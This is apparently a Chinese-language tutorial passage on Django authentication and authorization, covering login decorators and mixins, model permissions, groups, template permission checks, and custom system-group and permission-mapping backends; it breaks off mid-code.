['AuthenticationForm', 'FormView', 'HttpResponseRedirect', 'INTERNAL_RESET_SESSION_TOKEN', 'INTERNAL_RESET_URL_TOKEN', 'LoginView', 'LogoutView', 'PasswordChangeDoneView', 'PasswordChangeForm', 'PasswordChangeView', 'PasswordContextMixin', 'PasswordResetCompleteView', 'PasswordResetConfirmView', 'PasswordResetDoneView', 'PasswordResetForm', 'PasswordResetView', 'QueryDict', 'REDIRECT_FIELD_NAME', 'SetPasswordForm', 'SuccessURLAllowedHostsMixin', 'TemplateView', 'UserModel', 'ValidationError', 'auth_login', 'auth_logout', 'csrf_protect', 'default_token_generator', 'get_current_site', 'get_user_model', 'is_safe_url', 'login_required', 'logout_then_login', 'method_decorator', 'never_cache', 'redirect_to_login', 'resolve_url', 'reverse_lazy', 'sensitive_post_parameters', 'settings', 'update_session_auth_hash', 'urlparse', 'urlsafe_base64_decode', 'urlunparse']

</pre><textarea>
# if you don't specify the login_url parameter, you'll need to ensure that the settings.LOGIN_URL and your login view are properly associated. For example, using the defaults, add the following lines to your URLconf:

from django.contrib.auth import views as auth_views
path('accounts/login/', auth_views.LoginView.as_view()), # myapp/templates/registration/login.html

path('change-password/', auth_views.PasswordChangeView.as_view(template_name='change-password.html'))

</textarea><pre>
【 Built-in forms 】
If you don't want to use the built-in views, but want the convenience of not having to write forms for this functionality, the authentication system provides several built-in forms located in django.contrib.auth.forms:

The built-in authentication forms make certain assumptions about the user model that they are working with. If you're using a custom user model, it may be necessary to define your own forms for the authentication system. For more information

>>> from django.contrib.auth import forms
>>> print([e for e in dir(forms) if not e.startswith('_')])
['AdminPasswordChangeForm', 'AuthenticationForm', 'EmailMultiAlternatives', 'PasswordChangeForm', 'PasswordResetForm', 'ReadOnlyPasswordHashField', 'ReadOnlyPasswordHashWidget', 'SetPasswordForm', 'UNUSABLE_PASSWORD_PREFIX', 'User', 'UserChangeForm', 'UserCreationForm', 'UserModel', 'UsernameField', 'authenticate', 'capfirst', 'default_token_generator', 'force_bytes', 'forms', 'get_current_site', 'get_user_model', 'gettext', 'identify_hasher', 'loader', 'password_validation', 'unicodedata', 'urlsafe_base64_encode']

【 Login和Logout的两个signals 】
Django的signal体系是一套简单实用的事件定义、事件产生、事件监听、事件处理框架,在登陆和登出这两个重要的点上提供了两个signal：
django.contrib.auth.signals.user_logged_in
django.contrib.auth.signals.user_logged_out

有三个参数会随singal传过来：
sender:user的class,如果是logout事件该值有可能是None如果用户根本就没有验证通过。
request:HttpRequest对象
user:user对象,如果是logout事件该值有可能是None如果用户根本就没有验证通过。

</pre><pre>
【 限制用户的访问权限 】
一个经常性的简单需求就是控制某些view只对登陆用户开放,如果未登录用户请求该view则跳转到登录界面让其登陆
很多时候要区分已登录用户和未登录用户,只对登录的用户开放一些页面或功能,限制未登录用户的行为,办法主要几种:

</pre>1.原始的办法:如果用户未登录重定向到登录页面<textarea>
from django.conf import settings
from django.shortcuts import redirect
def my_view(request):
    if not request.user.is_authenticated:
        return redirect('%s?next=%s' % (settings.LOGIN_URL, request.path))

或者显示一个错误信息:
from django.shortcuts import render
def my_view(request):
    if not request.user.is_authenticated:
        return render(request, 'myapp/login_error.html')

</textarea><pre>
2. 使用装饰器decorator
原型:login_required(redirect_field_name='next', login_url=None)
django.contrib.auth.decorators.login_required([redirect_field_name=REDIRECT_FIELD_NAME,login_url=None])
被该装饰器装饰的视图,强制要求用户必须登录后才可以访问。

login_required()装饰器工作机制:
用于装饰需要视图函数;使用了该装饰器的函数会判定是否已登录用户,如果没有将重定向到settings.LOGIN_URL指定的url并带上一个next参数例如:/accounts/login/?next=/polls/3/,next参数传入当前视图访问的绝对路径,已用于在登录后跳转的路径。这样login视图在登录成功后的跳转就可以从next提交的值获取,并设置一个获取不到的默认值为'index'首页就可以了。很方便的装饰器和其修改的next参数,其中next可用于模版中。
如果用户已经登录,执行正常的视图view方法,在view中的方法可以认为当前用户已经登陆了

login_required方法接受两个参数：
redirect_field_name:默认值是next,用来定义登陆成功之后的跳回之前访问界面的url
login_url:默认值是settings.LOGIN_URL,用来指定登陆界面的url

</pre><textarea>
# 没有参数的login_required装饰器使用方法：
from django.contrib.auth.decorators import login_required
@login_required
def my_view(request):
    ...

# 传递参数的使用方法：
此时默认的url中使用的参数是"next",如果想使用自定义的参数请修改login_required()的redirect_field_name参数,还需要重新定制登录模板,因为它引用了redirect_field_name变量
from django.contrib.auth.decorators import login_required
@login_required(redirect_field_name='my_redirect_field')
def my_view(request):
    ...

# login_required()装饰器还有一个可选的longin_url参数
from django.contrib.auth.decorators import login_required
@login_required(login_url='/accounts/login/')
def my_view(request):
    ...

如果不指定login_url参数,请确保settings.LOGIN_URL和登陆视图保持正确的关联
from django.contrib.auth import views as auth_views
url(r'^accounts/login/$', auth_views.login),

</textarea><pre>
3. 使用LoginRequired mixin
通过继承LoginRequiredMixin类的方式限制用户,在多继承时该类必须是最左边的父类。
If a view is using this mixin, all requests by non-authenticated users will be redirected to the login page or shown an HTTP 403 Forbidden error, depending on the raise_exception parameter.

Just as the login_required decorator, this mixin does NOT check the is_active flag on a user, but the default AUTHENTICATION_BACKENDS reject inactive users

You can set any of the parameters of AccessMixin to customize the handling of unauthorized users:

class AccessMixin
login_url
Default return value for get_login_url(). Defaults to None in which case get_login_url() falls back to settings.LOGIN_URL.

permission_denied_message
Default return value for get_permission_denied_message(). Defaults to an empty string.

redirect_field_name
Default return value for get_redirect_field_name(). Defaults to "next".

raise_exception
If this attribute is set to True, a PermissionDenied exception is raised when the conditions are not met. When False (the default), anonymous users are redirected to the login page.

get_login_url()
Returns the URL that users who don't pass the test will be redirected to. Returns login_url if set, or settings.LOGIN_URL otherwise.

get_permission_denied_message()
When raise_exception is True, this method can be used to control the error message passed to the error handler for display to the user. Returns the permission_denied_message attribute by default.

get_redirect_field_name()
Returns the name of the query parameter that will contain the URL the user should be redirected to after a successful login. If you set this to None, a query parameter won't be added. Returns the redirect_field_name attribute by default.

handle_no_permission()
Depending on the value of raise_exception, the method either raises a PermissionDenied exception or redirects the user to the login_url, optionally including the redirect_field_name if it is set.

</pre><textarea>
from django.contrib.auth.mixins import LoginRequiredMixin
class MyView(LoginRequiredMixin, View):
    login_url = '/login/'
    redirect_field_name = 'redirect_to'

# 登录验证,主要用于直接输入地址情况
path('index/',views.Index.as_view(),name='index'),

class Index(LoginRequiredMixin, View):
    # 没有登录则指定跳转,如果需要指定单独的跳转,则该类中指定login_url属性,如果需要指定全局的则在settings中指定LOGIN_URL属性
    login_url = '/auth/login/'

    def get(self,request):
        print(request.COOKIES)
        return render(request, 'index.html', locals())

</textarea>4. 进行测试,根据结果决定动作,也可以直接在视图中进行过滤:<textarea>
from django.shortcuts import redirect
def my_view(request):
    if not request.user.email.endswith('@example.com'):    # 根据用户的邮箱地址,判断用户的权限
        return redirect('/login/?next=%s' % request.path)

</textarea><pre>
5、user_passes_test(test_func, login_url=None, redirect_field_name='next')¶
As a shortcut, you can use the convenient user_passes_test decorator which performs a redirect when the callable returns False:

</pre><textarea>
from django.contrib.auth.decorators import user_passes_test

def email_check(user):
    return user.email.endswith('@example.com')

@user_passes_test(email_check)
def my_view(request):
    ...

</textarea><pre>
user_passes_test()takes a required argument: a callable that takes a User object and returns True if the user is allowed to view the page. Note that user_passes_test() does not automatically check that the User is not anonymous.

user_passes_test()takes two optional arguments:

login_url
Lets you specify the URL that users who don't pass the test will be redirected to. It may be a login page and defaults to settings.LOGIN_URL if you don't specify one.
redirect_field_name
Same as for login_required(). Setting it to None removes it from the URL, which you may want to do if you are redirecting users that don't pass the test to a non-login page where there's no "next page".
For example:
@user_passes_test(email_check, login_url='/login/')
def my_view(request): pass

6、class UserPassesTestMixin¶
When using class-based views, you can use the UserPassesTestMixin to do this.

test_func()
You have to override the test_func() method of the class to provide the test that is performed. Furthermore, you can set any of the parameters of AccessMixin to customize the handling of unauthorized users:

</pre><textarea>
from django.contrib.auth.mixins import UserPassesTestMixin

class MyView(UserPassesTestMixin, View):
    def test_func(self):
        return self.request.user.email.endswith('@example.com')

</textarea><pre>
get_test_func()
You can also override the get_test_func() method to have the mixin use a differently named function for its checks (instead of test_func()).

Stacking UserPassesTestMixin

Due to the way UserPassesTestMixin is implemented, you cannot stack them in your inheritance list. The following does NOT work:

class TestMixin1(UserPassesTestMixin):
    def test_func(self):
        return self.request.user.email.endswith('@example.com')

class TestMixin2(UserPassesTestMixin):
    def test_func(self):
        return self.request.user.username.startswith('django')

class MyView(TestMixin1, TestMixin2, View):
    ...
If TestMixin1 would call super() and take that result into account, TestMixin1 wouldn't work standalone anymore.

7. 使用权限需求装饰器@permission_required
Django内置了一个permission_required()装饰器,用户根据用户权限决定视图的访问权限
permission_required(perm, login_url=None, raise_exception=False)

</pre><textarea>
from django.contrib.auth.decorators import permission_required
@permission_required('polls.can_vote')  # 权限的格式是< app label>.< permission codename>
def my_view(request):
    pass

# 该装饰器还有一个可选的longin_url参数:As in the login_required() decorator, login_url defaults to settings.LOGIN_URL.
from django.contrib.auth.decorators import permission_required
@permission_required('polls.can_vote', login_url='/loginpage/')
def my_view(request):
    pass

# If the raise_exception parameter is given, the decorator will raise PermissionDenied, prompting the 403 (HTTP Forbidden) view instead of redirecting to the login page.

If you want to use raise_exception but also give your users a chance to login first, you can add the login_required() decorator:

from django.contrib.auth.decorators import login_required, permission_required

@login_required
@permission_required('polls.can_vote', raise_exception=True)
def my_view(request):
    ...
This also avoids a redirect loop when LoginView's redirect_authenticated_user=True and the logged-in user doesn't have all of the required permissions

</textarea>8、PermissionRequiredMixin<textarea>
from django.contrib.auth.mixins import PermissionRequiredMixin

class MyView(PermissionRequiredMixin, View):
    permission_required = 'polls.can_vote'
    # Or multiple of permissions:
    permission_required = ('polls.can_open', 'polls.can_edit')

# 展示主页
class Home(PermissionRequiredMixin,View):
    # 单个权限
    permission_required = 'auth_study.view_product'
    # 多个权限,要同时具有,且的关系,元祖或列表都可
    # permission_required = ['auth_study.view_products','auth_study.update_products']
    # 上面个相当于全局的,只有满足了上面权限中的一个就可以进入下面的get了,否则就跳转到setting配置的LOGIN_URL去了
    def get(self,request):
        print('get...',request.user.user_permissions.all())
        # has_perm(perm)： 判断用户是否有某个权限。
        # has_perms(perm_list)： 判断用户是否有权限列表中的某个列表。
        if request.user.has_perm('auth_study.view_product'):
            products = Product.objects.all()
            if request.user.has_perm('auth_study.add_product'):
                canAdd = True   #判断有没有添加权限,然后置为True,页面去判断是否显示相关
        else:
            message = '没有查看商品的权限'
        return render(request,'home.html',locals())

</textarea><pre>
【 Helper functions 】
redirect_to_login(next, login_url=None, redirect_field_name='next')
Redirects to the login page, and then back to another URL after a successful login.

Required arguments:
next: The URL to redirect to after a successful login.

Optional arguments:
login_url: The URL of the login page to redirect to. Defaults to settings.LOGIN_URL if not supplied.
redirect_field_name: The name of a GET field containing the URL to redirect to after log out. Overrides next if the given GET parameter is passed.

</pre>

<h4>django(权限、认证)系统—— Permissions和Group</h4><pre>
使用Authentication系统进行用户的创建、登陆、登出,完成了用户的认证,接下来是Authorization授权Permission
Django提供了一个简单的权限系统,并且已经用于它的admin站点,当然也可以在代码中使用。

Django的权限系统,可以认为是轻量级的RBAC系统,其中组可以对应RBAC的角色,通过将权限分配给组,再将用户分配到组中,从而实现了授权的过程,同时Django还支持直接对用户进行授权

Django中的Permissions设置主要通过Django自带的Admin界面进行维护,主要通过设置某些用户对应于某类模型的add\change\delete三种类型的权限,即设置某些人对某些模型能够增加、修改、删除的权限设置。

Permission不仅仅能够设置某类模型,还可以针对一个模型的某一个对象进行设置
has_view_permission(), has_add_permission(), has_change_permission() and has_delete_permission() methods provided by the ModelAdmin class, it is possible to customize permissions for different object instances of the same type
ModelAdmin.has_view_permission(request, obj=None)
ModelAdmin.has_add_permission(request)
ModelAdmin.has_change_permission(request, obj=None)
ModelAdmin.has_delete_permission(request, obj=None)
ModelAdmin.has_module_permission(request)

【 Permissions 】
Permission模型：
所属模块：django.contrib.auth.models

属性：
name:必填。小于50个字符,例如：'Can publish'。
codename：必填。小于100个字符,例如：'can_publish'。
content_type：必填。一个指向django_content_type数据库表,对于每一个Django模型在这个表里面都有一个记录对应。

方法：没有特殊方法。具有所有普通DjangoModel的方法。

默认使用manage.py migrate命令时Django会给每个已存在的model添加默认的权限：view,add,change,delete

sqlite> select * from auth_permission;
id|content_type_id|codename|name
25|7|add_product|Can add product
26|7|change_product|Can change product
27|7|delete_product|Can delete product
28|7|view_product|Can view product

查看一个user对象对myapp应用里有一个模型叫做Product有哪些权限：
user.hash_perm('myapp.view_product')
user.hash_perm('myapp.add_product')
user.hash_perm('myapp.change_product')
user.hash_perm('myapp.delete_product')

添加模型额自定义权限：
1、通过在模型定义时预定义,然后migrate的方式创建permission
2、用编程的方式动态创建并分配权限

</pre>自定义Permission方法就是在Model类的meta属性中添加permissions定义<textarea>
# 创建Discussion(讨论)模型类,可以创建几个权限来对这个模型的权限许可进行控制,控制某些人可以发起讨论、发起回复,关闭讨论。
class Discussion(models.Model):
    ...
    class Meta:
        permissions = (
            ("open_discussion", "Can create a discussion,发起讨论"),
            ("reply_discussion", "Can reply discussion,发起回复"),
            ("close_discussion", "Can remove a discussion by setting its status as closed,关闭讨论"),
        )

# 接下来要做的就是最后一步,执行manage.py migrate,这样数据库中就有了这三个许可了。

# 可以将上面的权限赋予用户,方法有两种：
1、通过某一个user的user_permissions属性：
user.user_permissions.add(permission, permission, ...)
　　
2、通过user的一个组,然后通过Group的permissions属性：
group.permissions.add(permission, permission, ...)
　　
# 要判断一个用户是否有发讨论的权限
user.has_perm('myapp.open_discussion')

</textarea>在模型中添加Permission权限,需要控制权限的模型中添加权限,即通过这些权限,能做什么事情<textarea>
class Task(models.Model):
    class Meta:
        permissions = (
            ("view_task", "查看任务权限"),
            ("change_task_status", "修改任务权限"),
            ("close_task", "关闭任务权限"),
        )

</textarea>在代码中添加/创建权限,一般在模型中增加,毕竟只有那么一次<textarea>
from myapp.models import BlogPost
from django.contrib.auth.models import Permission
from django.contrib.contenttypes.models import ContentType

content_type = ContentType.objects.get_for_model(BlogPost)
permission = Permission.objects.create(codename='can_publish', name='Can Publish Posts',content_type=content_type )

# 为school app中的Discussion模型添加一个can_publish权限,然后可通过User模型的user_permissions属性或Group模型的permissions属性为用户添加该权限
from django.contrib.auth.models import Group, Permission
from django.contrib.contenttypes.models import ContentType
content_type = ContentType.objects.get(app_label='school', model='Discussion')
permission = Permission.objects.create(codename='can_publish', name='Can Publish Discussions', content_type=content_type)

</textarea><pre>
【 给用户授权 】
1、后台管理系统中

2、代码中授权：
permission = Permission.objects.get(name=u'查看商品信息')       #对应auth_permission表中
myuser.user_permissions.set([permission_list])                 # 设置一个权限列表
myuser.user_permissions.add(permission, permission, ...)       # 添加一个权限
myuser.user_permissions.remove(permission, permission, ...)    # 删除多个权限
myuser.user_permissions.clear()                                # 清理所有权限
myuser.save()                                                  # 以上操作都需要save,因为他们都是一个数据库操作

【 权限验证 】
myuser.has_perm('foo.add_bar')

from django.contrib.auth.mixins import PermissionRequiredMixin
class MyView(PermissionRequiredMixin, View):
    permission_required = 'polls.can_vote'  # 单个权限
    permission_required = ('polls.can_open', 'polls.can_edit') # 多个权限,且的关系

【 Template使用权限 】
模版代码中有两个属性是Django提供的:一个是user(request.user),一个是perms。
在Django进入解析Template之前,首先要经过settings中TEMPLATE_CONTEXT_PROCESSORS中定义的一个个的context_processor。其中django.contrib.auth.context_processors.auth处理器就是将user和perms这俩对象放到TemplateContext中去的。

</pre>判断一个用户是否是登陆用户,进而作出不同的显示<textarea>
{% if user.is_authenticated %}
    <p>Welcome, {{ user.username }}. Thanks for logging in.</p>
{% else %}
    <p>Welcome, new user. Please log in.</p>
{% endif %}

</textarea><pre>
user变量是一个User或AnoymousUser对象。

perms变量是一个django.contrib.auth.context_processors.PermWrapper对象,对当前用户的User.has_module_perms和User.has_perm进行了封装,这个包装器让你使用perm起来非常的方便,比如需要判断当前用户是否拥有school应用下的所有权限,则使用{{perms.school}}
如果判断当前用户是否拥有school应用下发表讨论的权限,则使用{{perms.school.publish_discussion}}
这样结合template的if标签可以通过判断当前用户所具有的权限,显示不同的界面了：

</pre><textarea>
{% if perms.school %}
    <p>You have permission to do something in the school app.</p>
    {% if perms.school.publish_discussion %}
        <p>You can discussion!</p>
    {% endif %}
    {% if perms.school.reply_discussion %}
        <p>You can reply discussion!</p>
    {% endif %}
{% else %}
    <p>You don't have permission to do anything in the school app.</p>
{% endif %}

</textarea><textarea>
{% if 'foo' in perms %}
    {% if 'foo.can_vote' in perms %}
        <p>In lookup works, too.</p>
    {% endif %}
{% endif %}

</textarea><pre>
【 权限缓存 】
权限检查后会被缓存在用户对象中

</pre><textarea>
from django.contrib.auth.models import Permission, User
from django.shortcuts import get_object_or_404

def user_gains_perms(request, user_id):
    user = get_object_or_404(User, pk=user_id)
    # any permission check will cache the current set of permissions
    user.has_perm('myapp.change_bar')

    permission = Permission.objects.get(codename='change_bar')
    user.user_permissions.add(permission)

    # Checking the cached permission set
    user.has_perm('myapp.change_bar')  # False

    # Request new instance of User,Be aware that user.refresh_from_db() won't clear the cache.
    user = get_object_or_404(User, pk=user_id)

    # Permission cache is repopulated from the database
    user.has_perm('myapp.change_bar')  # True

</textarea><pre>
【 用户组(Group) 】
Django提供了一个django.contrib.auth.models.Group模型,该model可用于对用户进行了分组,其作用在权限控制中就是可以批量的对用户的许可进行分配,而不用一个一个的按用户分配,节省维护的工作量,实现批量管理。用户模型和组模型属于多对多的关系。用户自动具有所属组的所有权限。

将一个用户加入到一个Group中,该用户就拥有了该Group所分配的所有许可。例如如果一个组teachers有许可can_create_lesson,那么所有属于teachers组的用户都会有这个权限。

Group属性：
name:必须。少于80个字符。
permissions:多对多引用。和user的user_permissions属性类型相同,可以通过以下方法给该组赋予权限
group.permissions = [permission_list]
group.permissions.add(permission, permission, ...)
group.permissions.remove(permission, permission, ...)
group.permissions.clear()
group.save()

创建Group
必须传一个name参数进去。

Group操作：
group.permissions.set([permission_list]) # 设置这个组包含的权限列表
group.permissions.add(permission, permission, ...) # 添加一个权限到这个组
group.permissions.remove(permission, permission, ...) # 从这个组中删除一个权限
group.permissions.clear() # 清理这个组的权限

myuser.groups.set([group_list]) # 设置一些组
myuser.groups.add(group, group, ...) # 添加某些组
myuser.groups.remove(group, group, ...) # 删除某些组
myuser.groups.clear() # 清理所有租

</pre>

<h4>对象级权限</h4><pre>
has_perm(perm, obj=None)
has_perms(perm_list,obj=None)
get_group_permissions(obj=None)
get_all_permissions(obj=None)
Django内置的权限授权是针对Model进行的授权,每个Model默认都会生成三个权限：add、change、delete。如一旦授予某用户Change权限,那么该用户就拥有了该Model所有对象的Change权限,但有些时候希望仅允许用户对该Model下的指定对象进行操作,比如新闻发布系统可以允许所有的编辑人员进行新闻的发布,但仅允许发布新闻的编辑人员修改自己所发布的新闻,这时候Django的权限系统引入更细粒度的对象级权限支持
对象级权限,即针对的Model对象实例进行授权操作,使用我们可以精确的对单个对象进行权限的控制,以实现更细精度的权限控制

目前已经有非常好的对象级权限的第三方实现django-guardian

【 系统组 https://github.com/Kidwind/django-systemgroups 】
Django默认的权限系统中只有组的概念,没有什么系统组啊？其实系统组只是我们为了区别与现有组的一种称呼而已,你可以给它起一个更酷的名字。那么如何理解系统组呢？我们知道Django里的组都需要我们进行硬性的绑定才会生效的,比如你创建一个"编辑"的组,那么你需要给编辑这个组授予相应内容的编辑权限,同时你需要将相应的用户分配至该"编辑"组,那么用户才会真正的拥有了编辑应有的权限,这在大多数情况下是没有问题的,但这种硬性的绑定极大的限制了系统的灵活性,因为很多时候系统是需要根据运行时的环境来决定用户应该属于哪些组的。结合上文对象级权限中新闻发布的例子,如果使用对象级权限的方式来实现的话,我们就必需在用户发布新闻的同时,向对象级权限系统中添加一条权限分配的记录(对象级权限系统是需要独立的数据表来记录用户或组与对象的权限关系),这好像也没什么问题,无非是重写save方法或都添加一条signals就可以应对了,但如果我们希望用户的上级领导也能够修改该信息呢,你可能会说给上级领导也添加一条对象级权限啊,但如果该用户的上级领导变更了呢？如果我们又希望用户同部门的员工允许修改呢？是不是开始变得麻烦了,如果有一种机制来处理这种动态关系,那事情就变得简单多了,而实现这一机制的就是系统组。系统组就是在系统运行期,根据运行环境来决定用户所隶属的组,从而实现灵活的授权机制。

系统组本身并非系统运行时动态创建的,而是在开发阶段根据业务需要创建的,系统组机制只是在运行时由系统决定用户与系统组的关系而已。因而在业务开发阶段,我们就必需确定好业务所需的系统组。当然也可以从所有的业务中抽象出一些具备全局通用性的系统组,以下列出抽象出来的具备通用性的系统组：
1) Everyone：所有人,无论是用户还是访客,都属于Everyone组。
2) Anonymous：匿名用户,非认证的用户都属于Anonymous组。
3) Users：用户,所有认证的用户都属于Users组。
4) Creator：创建者,针对具体信息的创建者,都属于Creator组。
5) Owner：所有者,具体信息的拥有者,都属于Owner组。

还可以针对特定的业务创建针对性的系统组,如上例中,允许用户的上级领导修改该用户所发布的信息,那么我们可以创建一个名为"信息所有者的上级领导"这样的系统组

# 看下面代码,我们声明了我们所需的系统组的常量,声明为常量是便于代码的调用
SYSTEM_GROUP_EVERYONE = "Everyone"      # 所有人
SYSTEM_GROUP_ANONYMOUS = "Anonymous"    # 匿名用户
SYSTEM_GROUP_USERS = "Users"            # 用户
SYSTEM_GROUP_STAFFS = "Staffs"          # 职员
SYSTEM_GROUP_CREATOR = "Creator"        # 创建者
SYSTEM_GROUP_OWNER = "Owner"            # 所有者

根据上文所述,系统组是在开发阶段就应该确定,那么确定后的系统组应该如何在系统中体现呢？其实系统组只是我们定义的一个概念,为了保证Django系统权限调用接口的一至性,它仍然是一个组对象,只是是一个我们赋予了特殊意义的组,我们仍然需要在Django的"组"这个Model中创建相应的系统组对象(当然如果考虑到系统组的特殊性,可以通过一些机制来限制对系统组的修改和删除操作,以保证系统组始终可用)。可以通过声明一个系统组初始化的方法,并在适当的地方调用他,当然也可以使用Django提供的初始数据方法来初始系统组

</pre><textarea>
from django.contrib.auth.models import Group

def init_systemgroups():
    Group.objects.get_or_create(name=SYSTEM_GROUP_EVERYONE)
    Group.objects.get_or_create(name=SYSTEM_GROUP_ANONYMOUS)
    Group.objects.get_or_create(name=SYSTEM_GROUP_USERS)
    Group.objects.get_or_create(name=SYSTEM_GROUP_STAFFS)
    Group.objects.get_or_create(name=SYSTEM_GROUP_CREATOR)
    Group.objects.get_or_create(name=SYSTEM_GROUP_OWNER)

</textarea><pre>
现在我们已经有了系统组数据了,接下来我们就需要实现系统组的核心逻辑了,从Django所提供的权限验证接口User.has_perm(perm, obj=None),我们可以看出存在两种情况：一种是不提供obj参数的情况,我们可以语义化理解为"用户(User)是否拥有perm权限";一种是提供了obj参数的情况,我们可以语义化理解为"用户(User)是否拥有指定对象(obj)的perm权限"。同样的,我们系统组也可以分为两种情况：一种是与obj参数无关的,可以语义化理解为"用户(User)是否为系统组(system group)的成员",这包括上面所列的Everyone、Anonymous、Users、Staffs等;一种是与obj参数有关的,可以语义化理解为"用户(User)是否为对象(obj)的系统组(system group)的成员",包括上面所列的Creator、Owner等。依赖于相同的参数,使得我们可以保持与Django一至的验证接口,我们现在要做的是根据这些参数,给系统返回恰当的系统组,先来看看与obj参数无关的情况的代码：

</pre><textarea>
def get_user_systemgroups(user):
    """
    获取指定用户所属的系统组集合。
    :param user: 指定的用户。
    :return: set 表示的用户所属的系统组名称集合。
    """
    groups = set()
    groups.add(SYSTEM_GROUP_EVERYONE)
    if user.is_anonymous():
        groups.add(SYSTEM_GROUP_ANONYMOUS)
    else:
        groups.add(SYSTEM_GROUP_USERS)
        if user.is_staff:
            groups.add(SYSTEM_GROUP_STAFFS)

    return groups

</textarea><pre>
只是对User进行简单的验证,就可以获得User有关的系统组了,而第二种与obj参数有关的情况就比较复杂了,比如Creator组,我们必需要获取对象的创建者,我们才能与User进行比较,从而验证User是否为obj的创建者,然而Creator组是我们抽象出来的全局通用的组,意味着我们的Model需要提供一至的方法来获取对象的创建者,这时我们需要定义一个接口(Python没有提供接口的概念,只是通过抽象的方法来模拟)来实现：

</pre><textarea>
class CreatorMixin(object):
    """
    实现创建者的 Model 基类。
    """
    def get_creator(self):
        """
        获取对象的创建者,子类重写该方法实现创建者对象的获取。
        :return: 当前对象的创建者。
        """
        return None

    def set_creator(self, user):
        """
        设置对象的创建者,子类重写该方法实现创建者对象的设置。
        :param creator: 要设置为创建者的User对象。
        :return:
        """
        pass

</textarea><textarea>
class OwnerMixin(object):
    """
    实现所有者的 Model 基类。
    """
    def get_owner(self):
        """
        获取对象的所有者,子类重写该方法实现所有者对象的获取。
        :return: 当前对象的所有者。
        """
        return None

    def set_owner(self, user):
        """
        设置对象的所有者,子类重写该方法实现所有者对象的设置。
        :param owner: 要设置为所有者的User对象。
        :return:
        """
        pass

</textarea>第二种情况的实现<textarea>
def get_user_systemgroups_for_obj(user, obj):
    """
    获取指定用户相对于指定的对象所属的系统组集合。
    :param user: 指定的用户。
    :param obj: 相对于指定的对象。
    :return: set 表示的用户所属的系统组名称集合。
    """
    groups = set()
    if isinstance(obj, CreatorMixin) and obj.get_creator() == user:
        groups.add(SYSTEM_GROUP_CREATOR)
    if isinstance(obj, OwnerMixin) and obj.get_owner() == user:
        groups.add(SYSTEM_GROUP_OWNER)
    return groups

</textarea><pre>
为了保证系统组的扩展性,我们需要定义一套规则,使得你可以在你自己的应用中,扩展实现自己业务所需要的系统组,我们约定在你的应用中应该存在一个模块,模块中应该包含有以上声明的get_user_systemgroups(user)和get_user_systemgroups_for_obj(user, obj)两个方法,同时你需要在项目的settings.py文件中,告诉系统你的系统组实现的模块路径,类似如下：

</pre><textarea>
# 自定义系统组实现
SYSTEM_GROUP_IMPLEMENTERS = ['systemgroups.systemgroups', '你自己实现的系统组的路径'…]

同时需要提供一个方法来根据上面规则,依次获取所有应用中的用户所属的系统组集合,代码如下：
def get_user_systemgroups(user):
    """
    从所有应用中获取指定用户所属的系统组集合。
    :param user: 指定的用户。
    :return: set 表示的用户所属的系统组名称集合。
    """
    imps = SYSTEM_GROUP_IMPLEMENTERS
    groups = set()
    if not imps:
        return groups
    for imp in imps:
        imp = importlib.import_module(imp)
        if hasattr(imp, "get_user_systemgroups"):
            groups.update(imp.get_user_systemgroups(user))
    return groups

def get_user_systemgroups_for_obj(user, obj):
    """
    从所有应用中获取指定用户相对于指定的对象所属的系统组集合。
    :param user: 指定的用户。
    :param obj: 相对于指定的对象。
    :return: set 表示的用户所属的系统组名称集合。
    """
    imps = SYSTEM_GROUP_IMPLEMENTERS
    groups = set()
    if not imps:
        return groups
    for imp in imps:
        imp = importlib.import_module(imp)
        if hasattr(imp, "get_user_systemgroups_for_obj"):
            groups.update(imp.get_user_systemgroups_for_obj(user, obj))
    return groups

# 最后来实现认证后端：
def get_group_permissions(name):
    """
    获取指定名称的组所拥有的权限集合。
    :param name: 组的名称。
    :return: 权限集合。
    """
    perms = Permission.objects.filter(group__name = name)
    perms = perms.values_list('content_type__app_label', 'codename').order_by()
    return set(["%s.%s" % (ct, name) for ct, name in perms])

def get_groups_permissions(names):
    """
    获取指定名称的组所拥有的权限集合。
    :param names: 组的名称集合。
    :return: 权限集合。
    """
    perms = set()
    for name in names:
        perms.update(get_group_permissions(name))
    return perms

class SystemGroupBackend(object):
    def authenticate(self, username=None, password=None, **kwargs):
        return None

    def has_perm(self, user_obj, perm, obj=None):
        return perm in self.get_all_permissions(user_obj, obj)

    def get_all_permissions(self, user_obj, obj=None):
        perms = self.get_group_permissions(user_obj, obj)
        return perms

    def get_group_permissions(self, user_obj, obj=None):
        result_perms = set()

        groups = get_user_systemgroups(user_obj)
        perms = get_groups_permissions(groups)
        result_perms.update(perms)

        if obj is None:
            return result_perms

        groups = get_user_systemgroups_for_obj(user_obj, obj)
        perms = get_groups_permissions(groups)
        result_perms.update(perms)

        return result_perms

</textarea>

<h4>权限映射</h4><pre>
新闻根据性质进行分类的,比如实事新闻、财经新闻、体育新闻等,这时就形成了新闻类别(InfoCategory)和新闻(Info)一对多关系的两个Model,随着工作的细分,需要将不同的分类授权不同的部门来进行管理,对象级权限,给InfoCategory创建一个用于控制新闻类别下的新闻的修改权限change_info_by_category,通过针对新闻类别(InfoCategory)进行对象级的change_info_by_category授权,如果此时要进行某篇新闻的修改权限验证,需要对新闻所在栏目进行change_info_by_category的权限验证,像这样user.has_perm('app_label. change_info_by_category', obj=info.category),有什么问题吗？似乎也没什么问题,但细细分析一下,原本对新闻(Info)进行修改的权限验证方法user.has_perm('app_label.change_info', obj=info),需要人为的转换为上面的权限验证,相应的Django提供的Admin需要重写相应的方法来修改权限验证的逻辑,如果新闻(Info)本身还提供对象级的权限检测,我们的逻辑就需要改为要对两个方法都进行验证,还有更多复杂的情况,情况一变就需要重写权限验证逻辑吗,很麻烦不是吗,如果有一种方法能够实现上述权限验证的自动转换,能够保证权限调用方法不变,那事情就简单多了,而这一方法就是权限映射。简而言之,权限映射就是将用户对当前对象所执行的权限验证转换为用户对另一个对象的另一个权限进行验证的过程

</pre><textarea>
同系统组一样,Model需要提供一至的方法来根据当前的权限验证参数,获取映射后的权限验证参数,定义接口如下
class PermMappableMixin(object):
    """ 实现权限映射的 Model 基类 """
    @classmethod
    def mapping_permission(cls, perm, obj=None):
        """
        根据当前的权限验证参数,获取映射后的权限验证参数。(此类方法仅为标记方法,子类应实现相应的方法)
        :param perm: 当前检测的权限。
        :param obj: 当前进行检测权限的对象。
        :return: 返回值包含两个参数：第一个参数为映射后的权限;第二个参数为对应映射后的对象,其应为映射后权限所对应的 Model 的实例。
        """
        return None, None

# 接下来只需要实现认证后端就可以了：
from django.contrib.contenttypes.models import ContentType

class PermMappingBackend(object):
    def authenticate(self, username=None, password=None, **kwargs):
